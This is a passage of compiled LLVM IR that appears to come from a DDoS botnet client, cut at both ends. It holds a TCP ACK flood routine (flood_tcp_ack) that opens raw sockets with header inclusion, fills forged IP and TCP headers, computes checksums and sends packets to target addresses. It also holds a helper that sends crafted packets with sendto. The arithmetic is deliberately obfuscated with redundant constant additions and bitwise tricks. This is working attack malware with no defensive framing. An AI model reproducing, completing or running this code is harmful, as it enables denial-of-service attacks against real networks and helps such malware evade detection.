  %525 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %524, i32 0, i32 0
  %526 = bitcast %union.anon* %525 to %struct.anon.0*
  %527 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %526, i32 0, i32 6
  store i16 %523, i16* %527, align 4
  %528 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %528, align 4
  %529 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 0
  %531 = bitcast %union.anon* %530 to %struct.anon.0*
  %532 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %531, i32 0, i32 1
  %533 = load i16, i16* %532, align 2
  %534 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %533, i16* %534, align 2
  %535 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 9
  %537 = load i32, i32* %536, align 4
  %538 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %539 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %538, i32 0, i32 0
  store i32 %537, i32* %539, align 4
  %540 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 0
  %542 = bitcast %union.anon* %541 to %struct.anon.0*
  %543 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %542, i32 0, i32 3
  %544 = load i32, i32* %543, align 4
  %545 = call i32 @ntohl(i32 %544) #9
  %546 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 0
  %548 = bitcast %union.anon* %547 to %struct.anon.0*
  %549 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %548, i32 0, i32 2
  %550 = load i32, i32* %549, align 4
  %551 = call i32 @ntohl(i32 %550) #9
  %552 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i32 0, i32 0), i32 %545, i32 %551)
  %553 = load i32, i32* %8, align 4
  %554 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i32 0, i32 0
  %555 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %556 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  store %struct.sockaddr* %556, %struct.sockaddr** %555, align 8
  %557 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %558 = load %struct.sockaddr*, %struct.sockaddr** %557, align 8
  %559 = call i64 @sendto(i32 %553, i8* %554, i64 40, i32 16384, %struct.sockaddr* %558, i32 16)
  %560 = trunc i64 %559 to i32
  store i32 %560, i32* %22, align 4
  br label %568

; <label>:561:                                    ; preds = %355, %338, %332
  %562 = load i32, i32* %24, align 4
  %563 = sub i32 0, %562
  %564 = sub i32 0, 1
  %565 = add i32 %563, %564
  %566 = sub i32 0, %565
  %567 = add nsw i32 %562, 1
  store i32 %566, i32* %24, align 4
  br label %318

; <label>:568:                                    ; preds = %372, %331, %318
  %569 = load i32, i32* %22, align 4
  %570 = icmp eq i32 %569, -1
  %571 = select i1 %570, i32 0, i32 1
  store i32 %571, i32* %6, align 4
  br label %572

; <label>:572:                                    ; preds = %568, %316, %302
  %573 = load i32, i32* %6, align 4
  ret i32 %573
}

declare zeroext i16 @ip_header_checksum(i16*, i32) #6

declare zeroext i16 @tcp_udp_header_checksum(%struct.iphdr*, i8*, i16 zeroext, i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #6

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, 8779980112235075972
  %16 = add i64 %15, %13
  %17 = sub i64 %16, 8779980112235075972
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 0, 2
  %22 = add i32 %20, %21
  %23 = sub i32 %20, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp eq i32 %25, 1
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = load i16, i16* %28, align 2
  %30 = trunc i16 %29 to i8
  %31 = sext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 65535, -1
  %41 = xor i64 %39, %40
  %42 = and i64 %41, %39
  %43 = and i64 %39, 65535
  %44 = sub i64 %38, 7275197571826190756
  %45 = add i64 %44, %42
  %46 = add i64 %45, 7275197571826190756
  %47 = add i64 %38, %42
  store i64 %46, i64* %5, align 8
  %48 = load i64, i64* %5, align 8
  %49 = lshr i64 %48, 16
  %50 = load i64, i64* %5, align 8
  %51 = sub i64 0, %50
  %52 = sub i64 0, %49
  %53 = add i64 %51, %52
  %54 = sub i64 0, %53
  %55 = add i64 %50, %49
  store i64 %54, i64* %5, align 8
  %56 = load i64, i64* %5, align 8
  %57 = xor i64 %56, -1
  %58 = and i64 -1, %57
  %59 = xor i64 -1, -1
  %60 = and i64 %56, %59
  %61 = or i64 %58, %60
  %62 = xor i64 %56, -1
  %63 = trunc i64 %61 to i16
  ret i16 %63
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %42

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 %30, 102373801
  %32 = add i32 %31, %29
  %33 = add i32 %32, 102373801
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = add i32 %37, -1619011454
  %39 = sub i32 %38, 2
  %40 = sub i32 %39, -1619011454
  %41 = sub nsw i32 %37, 2
  store i32 %40, i32* %8, align 4
  br label %23

; <label>:42:                                     ; preds = %23
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, 1
  br i1 %44, label %45, label %56

; <label>:45:                                     ; preds = %42
  %46 = load i16*, i16** %9, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = load i32, i32* %12, align 4
  %51 = sub i32 0, %50
  %52 = sub i32 0, %49
  %53 = add i32 %51, %52
  %54 = sub i32 0, %53
  %55 = add i32 %50, %49
  store i32 %54, i32* %12, align 4
  br label %56

; <label>:56:                                     ; preds = %45, %42
  %57 = load i32, i32* %10, align 4
  %58 = lshr i32 %57, 16
  %59 = xor i32 65535, -1
  %60 = xor i32 %58, %59
  %61 = and i32 %60, %58
  %62 = and i32 %58, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, -243546810
  %65 = add i32 %64, %61
  %66 = sub i32 %65, -243546810
  %67 = add i32 %63, %61
  store i32 %66, i32* %12, align 4
  %68 = load i32, i32* %10, align 4
  %69 = xor i32 %68, -1
  %70 = xor i32 65535, -1
  %71 = xor i32 -776501880, -1
  %72 = or i32 %69, %70
  %73 = or i32 -776501880, %71
  %74 = xor i32 %72, -1
  %75 = and i32 %74, %73
  %76 = and i32 %68, 65535
  %77 = load i32, i32* %12, align 4
  %78 = sub i32 0, %75
  %79 = sub i32 %77, %78
  %80 = add i32 %77, %75
  store i32 %79, i32* %12, align 4
  %81 = load i32, i32* %11, align 4
  %82 = lshr i32 %81, 16
  %83 = xor i32 65535, -1
  %84 = xor i32 %82, %83
  %85 = and i32 %84, %82
  %86 = and i32 %82, 65535
  %87 = load i32, i32* %12, align 4
  %88 = sub i32 0, %87
  %89 = sub i32 0, %85
  %90 = add i32 %88, %89
  %91 = sub i32 0, %90
  %92 = add i32 %87, %85
  store i32 %91, i32* %12, align 4
  %93 = load i32, i32* %11, align 4
  %94 = xor i32 65535, -1
  %95 = xor i32 %93, %94
  %96 = and i32 %95, %93
  %97 = and i32 %93, 65535
  %98 = load i32, i32* %12, align 4
  %99 = sub i32 %98, -2094218122
  %100 = add i32 %99, %96
  %101 = add i32 %100, -2094218122
  %102 = add i32 %98, %96
  store i32 %101, i32* %12, align 4
  %103 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %104 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %103, i32 0, i32 6
  %105 = load i8, i8* %104, align 1
  %106 = zext i8 %105 to i16
  %107 = call zeroext i16 @htons(i16 zeroext %106) #9
  %108 = zext i16 %107 to i32
  %109 = load i32, i32* %12, align 4
  %110 = add i32 %109, 2113709451
  %111 = add i32 %110, %108
  %112 = sub i32 %111, 2113709451
  %113 = add i32 %109, %108
  store i32 %112, i32* %12, align 4
  %114 = load i16, i16* %7, align 2
  %115 = zext i16 %114 to i32
  %116 = load i32, i32* %12, align 4
  %117 = sub i32 0, %115
  %118 = sub i32 %116, %117
  %119 = add i32 %116, %115
  store i32 %118, i32* %12, align 4
  br label %120

; <label>:120:                                    ; preds = %124, %56
  %121 = load i32, i32* %12, align 4
  %122 = lshr i32 %121, 16
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %124, label %135

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %12, align 4
  %126 = xor i32 65535, -1
  %127 = xor i32 %125, %126
  %128 = and i32 %127, %125
  %129 = and i32 %125, 65535
  %130 = load i32, i32* %12, align 4
  %131 = lshr i32 %130, 16
  %132 = sub i32 0, %131
  %133 = sub i32 %128, %132
  %134 = add i32 %128, %131
  store i32 %133, i32* %12, align 4
  br label %120

; <label>:135:                                    ; preds = %120
  %136 = load i32, i32* %12, align 4
  %137 = xor i32 %136, -1
  %138 = and i32 -118817952, %137
  %139 = xor i32 -118817952, -1
  %140 = and i32 %136, %139
  %141 = xor i32 -1, -1
  %142 = and i32 %141, -118817952
  %143 = and i32 -1, %139
  %144 = or i32 %138, %140
  %145 = or i32 %142, %143
  %146 = xor i32 %144, %145
  %147 = xor i32 %136, -1
  %148 = trunc i32 %146 to i16
  ret i16 %148
}

declare i32 @printf(i8*, ...) #6

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #6

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_ack(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i16, align 2
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i8**, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.tcphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i16 0, i16* %5, align 2
  store i16 0, i16* %6, align 2
  store i8 0, i8* %7, align 1
  store i16 0, i16* %8, align 2
  store i8 0, i8* %10, align 1
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
  store i8 0, i8* %14, align 1
  store i8 0, i8* %15, align 1
  store i8 0, i8* %16, align 1
  store i16 0, i16* %17, align 2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 2, i16 zeroext 900)
  store i16 %37, i16* %5, align 2
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 1
  %40 = load %struct.option*, %struct.option** %39, align 8
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 8
  %44 = call zeroext i16 @retrieve_opt_num(%struct.option* %40, i8 zeroext %43, i8 zeroext 1, i16 zeroext -1)
  store i16 %44, i16* %6, align 2
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 8
  %51 = call zeroext i16 @retrieve_opt_num(%struct.option* %47, i8 zeroext %50, i8 zeroext 7, i16 zeroext 255)
  %52 = trunc i16 %51 to i8
  store i8 %52, i8* %7, align 1
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 2
  %58 = load i8, i8* %57, align 8
  %59 = call zeroext i16 @retrieve_opt_num(%struct.option* %55, i8 zeroext %58, i8 zeroext 8, i16 zeroext -1)
  store i16 %59, i16* %8, align 2
  %60 = load %struct.arguments*, %struct.arguments** %2, align 8
  %61 = getelementptr inbounds %struct.arguments, %struct.arguments* %60, i32 0, i32 1
  %62 = load %struct.option*, %struct.option** %61, align 8
  %63 = load %struct.arguments*, %struct.arguments** %2, align 8
  %64 = getelementptr inbounds %struct.arguments, %struct.arguments* %63, i32 0, i32 2
  %65 = load i8, i8* %64, align 8
  %66 = call zeroext i16 @retrieve_opt_num(%struct.option* %62, i8 zeroext %65, i8 zeroext 9, i16 zeroext 1)
  %67 = trunc i16 %66 to i8
  store i8 %67, i8* %10, align 1
  %68 = load %struct.arguments*, %struct.arguments** %2, align 8
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %68, i32 0, i32 1
  %70 = load %struct.option*, %struct.option** %69, align 8
  %71 = load %struct.arguments*, %struct.arguments** %2, align 8
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = call zeroext i16 @retrieve_opt_num(%struct.option* %70, i8 zeroext %73, i8 zeroext 10, i16 zeroext 0)
  %75 = trunc i16 %74 to i8
  store i8 %75, i8* %11, align 1
  %76 = load %struct.arguments*, %struct.arguments** %2, align 8
  %77 = getelementptr inbounds %struct.arguments, %struct.arguments* %76, i32 0, i32 1
  %78 = load %struct.option*, %struct.option** %77, align 8
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 2
  %81 = load i8, i8* %80, align 8
  %82 = call zeroext i16 @retrieve_opt_num(%struct.option* %78, i8 zeroext %81, i8 zeroext 11, i16 zeroext 0)
  %83 = trunc i16 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load %struct.arguments*, %struct.arguments** %2, align 8
  %85 = getelementptr inbounds %struct.arguments, %struct.arguments* %84, i32 0, i32 1
  %86 = load %struct.option*, %struct.option** %85, align 8
  %87 = load %struct.arguments*, %struct.arguments** %2, align 8
  %88 = getelementptr inbounds %struct.arguments, %struct.arguments* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = call zeroext i16 @retrieve_opt_num(%struct.option* %86, i8 zeroext %89, i8 zeroext 12, i16 zeroext 0)
  %91 = trunc i16 %90 to i8
  store i8 %91, i8* %13, align 1
  %92 = load %struct.arguments*, %struct.arguments** %2, align 8
  %93 = getelementptr inbounds %struct.arguments, %struct.arguments* %92, i32 0, i32 1
  %94 = load %struct.option*, %struct.option** %93, align 8
  %95 = load %struct.arguments*, %struct.arguments** %2, align 8
  %96 = getelementptr inbounds %struct.arguments, %struct.arguments* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = call zeroext i16 @retrieve_opt_num(%struct.option* %94, i8 zeroext %97, i8 zeroext 13, i16 zeroext 0)
  %99 = trunc i16 %98 to i8
  store i8 %99, i8* %14, align 1
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 1
  %102 = load %struct.option*, %struct.option** %101, align 8
  %103 = load %struct.arguments*, %struct.arguments** %2, align 8
  %104 = getelementptr inbounds %struct.arguments, %struct.arguments* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = call zeroext i16 @retrieve_opt_num(%struct.option* %102, i8 zeroext %105, i8 zeroext 14, i16 zeroext 0)
  %107 = trunc i16 %106 to i8
  store i8 %107, i8* %15, align 1
  %108 = load %struct.arguments*, %struct.arguments** %2, align 8
  %109 = getelementptr inbounds %struct.arguments, %struct.arguments* %108, i32 0, i32 1
  %110 = load %struct.option*, %struct.option** %109, align 8
  %111 = load %struct.arguments*, %struct.arguments** %2, align 8
  %112 = getelementptr inbounds %struct.arguments, %struct.arguments* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = call zeroext i16 @retrieve_opt_num(%struct.option* %110, i8 zeroext %113, i8 zeroext 15, i16 zeroext 0)
  %115 = trunc i16 %114 to i8
  store i8 %115, i8* %16, align 1
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 1
  %118 = load %struct.option*, %struct.option** %117, align 8
  %119 = load %struct.arguments*, %struct.arguments** %2, align 8
  %120 = getelementptr inbounds %struct.arguments, %struct.arguments* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = call zeroext i16 @retrieve_opt_num(%struct.option* %118, i8 zeroext %121, i8 zeroext 16, i16 zeroext -1)
  store i16 %122, i16* %17, align 2
  %123 = load %struct.arguments*, %struct.arguments** %2, align 8
  %124 = getelementptr inbounds %struct.arguments, %struct.arguments* %123, i32 0, i32 1
  %125 = load %struct.option*, %struct.option** %124, align 8
  %126 = load %struct.arguments*, %struct.arguments** %2, align 8
  %127 = getelementptr inbounds %struct.arguments, %struct.arguments* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 8
  %129 = call zeroext i16 @retrieve_opt_num(%struct.option* %125, i8 zeroext %128, i8 zeroext 17, i16 zeroext -1)
  %130 = zext i16 %129 to i32
  store i32 %130, i32* %18, align 4
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 1
  %133 = load %struct.option*, %struct.option** %132, align 8
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 8
  %137 = load i32, i32* @LOCAL_ADDRESS, align 4
  %138 = call i32 @retrieve_opt_ipv4(%struct.option* %133, i8 zeroext %136, i8 zeroext 18, i32 %137)
  store i32 %138, i32* %19, align 4
  %139 = load %struct.arguments*, %struct.arguments** %2, align 8
  %140 = getelementptr inbounds %struct.arguments, %struct.arguments* %139, i32 0, i32 1
  %141 = load %struct.option*, %struct.option** %140, align 8
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = call zeroext i16 @retrieve_opt_num(%struct.option* %141, i8 zeroext %144, i8 zeroext 19, i16 zeroext -1)
  %146 = zext i16 %145 to i32
  store i32 %146, i32* %20, align 4
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 1
  %149 = load %struct.option*, %struct.option** %148, align 8
  %150 = load %struct.arguments*, %struct.arguments** %2, align 8
  %151 = getelementptr inbounds %struct.arguments, %struct.arguments* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 8
  %153 = call i8* @retrieve_opt_str(%struct.option* %149, i8 zeroext %152, i8 zeroext 6, i8* null)
  store i8* %153, i8** %21, align 8
  %154 = load %struct.arguments*, %struct.arguments** %2, align 8
  %155 = getelementptr inbounds %struct.arguments, %struct.arguments* %154, i32 0, i32 1
  %156 = load %struct.option*, %struct.option** %155, align 8
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = call i8* @retrieve_opt_str(%struct.option* %156, i8 zeroext %159, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %161 = ptrtoint i8* %160 to i32
  store i32 %161, i32* %23, align 4
  %162 = load %struct.arguments*, %struct.arguments** %2, align 8
  %163 = getelementptr inbounds %struct.arguments, %struct.arguments* %162, i32 0, i32 3
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = call noalias i8* @calloc(i64 %165, i64 8) #8
  %167 = bitcast i8* %166 to i8**
  store i8** %167, i8*** %9, align 8
  %168 = load i8**, i8*** %9, align 8
  %169 = icmp ne i8** %168, null
  br i1 %169, label %171, label %170

; <label>:170:                                    ; preds = %1
  call void @exit(i32 1) #10
  unreachable

; <label>:171:                                    ; preds = %1
  %172 = load %struct.arguments*, %struct.arguments** %2, align 8
  %173 = getelementptr inbounds %struct.arguments, %struct.arguments* %172, i32 0, i32 3
  %174 = load i8, i8* %173, align 1
  %175 = zext i8 %174 to i64
  %176 = call noalias i8* @calloc(i64 %175, i64 4) #8
  %177 = bitcast i8* %176 to i32*
  store i32* %177, i32** %22, align 8
  %178 = load i32*, i32** %22, align 8
  %179 = icmp ne i32* %178, null
  br i1 %179, label %181, label %180

; <label>:180:                                    ; preds = %171
  call void @exit(i32 1) #10
  unreachable

; <label>:181:                                    ; preds = %171
  store i32 0, i32* %3, align 4
  br label %182

; <label>:182:                                    ; preds = %562, %181
  %183 = load i32, i32* %3, align 4
  %184 = load %struct.arguments*, %struct.arguments** %2, align 8
  %185 = getelementptr inbounds %struct.arguments, %struct.arguments* %184, i32 0, i32 3
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %183, %187
  br i1 %188, label %189, label %568

; <label>:189:                                    ; preds = %182
  %190 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %191 = load i32*, i32** %22, align 8
  %192 = load i32, i32* %3, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i32, i32* %191, i64 %193
  store i32 %190, i32* %194, align 4
  %195 = load i32*, i32** %22, align 8
  %196 = load i32, i32* %3, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds i32, i32* %195, i64 %197
  %199 = load i32, i32* %198, align 4
  %200 = icmp eq i32 %199, -1
  br i1 %200, label %201, label %204

; <label>:201:                                    ; preds = %189
  %202 = load i8**, i8*** %9, align 8
  %203 = bitcast i8** %202 to i8*
  call void @free(i8* %203) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:204:                                    ; preds = %189
  store i32 1, i32* %4, align 4
  %205 = load i32*, i32** %22, align 8
  %206 = load i32, i32* %3, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = bitcast i32* %4 to i8*
  %211 = call i32 @setsockopt(i32 %209, i32 0, i32 3, i8* %210, i32 4) #8
  %212 = icmp eq i32 %211, -1
  br i1 %212, label %213, label %216

; <label>:213:                                    ; preds = %204
  %214 = load i8**, i8*** %9, align 8
  %215 = bitcast i8** %214 to i8*
  call void @free(i8* %215) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:216:                                    ; preds = %204
  %217 = load i32, i32* %23, align 4
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %219, label %238

; <label>:219:                                    ; preds = %216
  %220 = load i16, i16* %6, align 2
  %221 = load i32*, i32** %22, align 8
  %222 = load i32, i32* %3, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds i32, i32* %221, i64 %223
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.arguments*, %struct.arguments** %2, align 8
  %227 = getelementptr inbounds %struct.arguments, %struct.arguments* %226, i32 0, i32 0
  %228 = load %struct.target*, %struct.target** %227, align 8
  %229 = load i32, i32* %3, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.target, %struct.target* %228, i64 %230
  %232 = getelementptr inbounds %struct.target, %struct.target* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %19, align 4
  %235 = load i16, i16* %8, align 2
  %236 = zext i16 %235 to i32
  %237 = call i32 @tcp_handshake(i16 zeroext %220, i32 %225, i32 %233, i32 %234, i32 %236)
  br label %238

; <label>:238:                                    ; preds = %219, %216
  %239 = load i16, i16* %5, align 2
  %240 = zext i16 %239 to i32
  %241 = sub i32 0, %240
  %242 = sub i32 0, 110
  %243 = add i32 %241, %242
  %244 = sub i32 0, %243
  %245 = add nsw i32 %240, 110
  %246 = sext i32 %244 to i64
  %247 = call noalias i8* @malloc(i64 %246) #8
  %248 = load i8**, i8*** %9, align 8
  %249 = load i32, i32* %3, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i8*, i8** %248, i64 %250
  store i8* %247, i8** %251, align 8
  %252 = load i8**, i8*** %9, align 8
  %253 = load i32, i32* %3, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds i8*, i8** %252, i64 %254
  %256 = load i8*, i8** %255, align 8
  %257 = icmp ne i8* %256, null
  br i1 %257, label %261, label %258

; <label>:258:                                    ; preds = %238
  %259 = load i8**, i8*** %9, align 8
  %260 = bitcast i8** %259 to i8*
  call void @free(i8* %260) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:261:                                    ; preds = %238
  %262 = load i8**, i8*** %9, align 8
  %263 = load i32, i32* %3, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds i8*, i8** %262, i64 %264
